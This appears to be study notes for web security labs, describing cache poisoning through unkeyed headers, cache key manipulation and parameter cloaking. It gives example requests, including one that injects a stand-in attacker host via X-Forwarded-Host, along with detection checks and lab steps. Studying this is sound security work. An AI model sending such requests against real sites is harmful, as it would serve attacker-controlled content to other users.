# Web Cache Poisoning - Attack Techniques

## Unkeyed Headers
```
# If X-Forwarded-Host is not part of cache key:
GET / HTTP/1.1
Host: target.com
X-Forwarded-Host: attacker.com

# Response may cache attacker.com in resource URLs
# Next user gets attacker.com's resources
```

## Cache Key Manipulation
```
# If cache key doesn't include all parameters:
GET /?utm_source=legit HTTP/1.1  # Cached
GET /?utm_source=evil HTTP/1.1   # Different cache key, same response
```

## Parameter Cloaking
```
# If cache normalizes parameters differently:
GET /?param=legit&param=evil HTTP/1.1
# Cache sees 'param=legit', backend sees 'param=evil'
```

## Detection
```
# Check cache headers
X-Cache: hit/miss
Cache-Control: max-age=N
Age: N

# Check if header is reflected
X-Forwarded-Host: test → check if 'test' appears in response
```

## PortSwigger Lab Approach
1. Send request with unkeyed header (X-Forwarded-Host)
2. Check if header value reflected in response
3. If reflected → cache poisoning possible
4. Deliver exploit to victim via cache
